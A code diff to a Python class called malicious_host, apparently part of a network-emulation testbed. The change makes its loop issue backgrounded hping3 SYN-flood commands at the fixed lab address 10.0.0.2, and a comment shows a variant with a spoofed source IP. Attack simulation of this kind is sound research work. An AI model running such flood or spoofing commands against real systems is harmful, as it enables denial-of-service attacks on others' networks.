@@ -56,13 +56,12 @@ class malicious_host():
     #  
   def attack_controller_ip(self, attack_interval, attack_number, number_of_hosts=2):
     #h1 hping3 -c 10 -S -p 9000 -a 192.168.1.100 10.0.0.2 can be used for IP attack
-    victim_ip = ip_generator(number_of_hosts)
-    start_time = time.time()
+    victim_ip = '10.0.0.2' #ip_generator(number_of_hosts)
     count = 0
     while( count<attack_number):
       attack_port = randint(80, 65000)
       for i in range(10):
-        attack = f'hping3 -d 10 -s {attack_port} -p 80 -c 1 {victim_ip}'
+        attack = f'hping3 -S -d 10 -s {attack_port} -p 80 -c 1 {victim_ip} &'
         self.attacks.append(attack)
       for j in self.attacks:
         self.net.cmd(j)
